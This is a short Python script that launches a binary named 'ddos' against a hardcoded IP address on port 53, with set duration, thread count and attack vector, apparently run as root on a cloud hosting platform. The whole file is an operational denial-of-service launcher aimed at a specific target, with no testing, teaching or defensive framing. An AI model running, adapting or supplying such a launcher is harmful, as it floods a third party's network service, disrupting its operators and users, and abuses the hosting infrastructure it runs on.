#!/usr/bin/env python3
import os
import subprocess
import sys

# Configuration
BINARY = "/app/ddos"
TARGET_IP = "147.75.202.61"
TARGET_PORT = "53"
DURATION = "240"
THREADS = "64"
VECTOR = "5"

def attack():
    # Make binary executable
    os.system(f'chmod 777 {BINARY}')
    
    # Check if binary exists
    if not os.path.exists(BINARY):
        print(f"Error: {BINARY} not found!")
        sys.exit(1)
    
    # Build command (NO sudo - Railway runs as root)
    cmd = [BINARY, TARGET_IP, TARGET_PORT, DURATION, THREADS, VECTOR]
    
    print(f"🔥 Starting attack on {TARGET_IP}:{TARGET_PORT}")
    print(f"   Duration: {DURATION}s | Threads: {THREADS} | Vector: {VECTOR}")
    print(f"   Command: {' '.join(cmd)}")
    
    # Execute attack with Popen (background)
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    print(f"✅ Attack started! PID: {process.pid}")
    
    # Optional: Wait and capture output
    try:
        stdout, stderr = process.communicate(timeout=5)
        if stdout:
            print(f"STDOUT: {stdout}")
        if stderr:
            print(f"STDERR: {stderr}")
    except subprocess.TimeoutExpired:
        print("⏳ Attack running in background...")

if __name__ == "__main__":
    attack()
